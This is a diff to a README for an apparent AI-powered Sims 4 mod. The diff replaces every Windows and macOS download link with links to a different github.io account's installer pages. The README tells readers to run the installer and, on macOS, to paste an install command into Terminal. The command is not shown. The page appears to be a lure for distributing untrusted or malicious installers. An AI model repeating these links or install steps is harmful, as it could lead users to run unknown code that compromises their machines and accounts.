@@ -8,8 +8,8 @@
 
 ---
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://BursarHypnotize.github.io/install-win/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://BursarHypnotize.github.io/install-mac/)
 
 ---
 
@@ -46,13 +46,13 @@ This is an **AI-powered mod**. Using a large language model running locally or v
 
 ### 🪟 Windows
 
-1. [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+1. [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://BursarHypnotize.github.io/install-win/)
 2. Run the installer and follow the on-screen steps
 3. Launch The Sims 4 — mod activates automatically 🚀
 
 ### 🍎 macOS
 
-1. [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+1. [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://BursarHypnotize.github.io/install-mac/)
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
 3. Paste the install command and press Enter
 4. Follow the prompts — installs automatically 🍏
@@ -86,8 +86,8 @@ This is an **AI-powered mod**. Using a large language model running locally or v
 
 **Sims 4 AI Life Simulator Edition** transforms your The Sims 4 experience. Download now and see the difference immediately.
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://BursarHypnotize.github.io/install-win/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://BursarHypnotize.github.io/install-mac/)
 
 ---
 
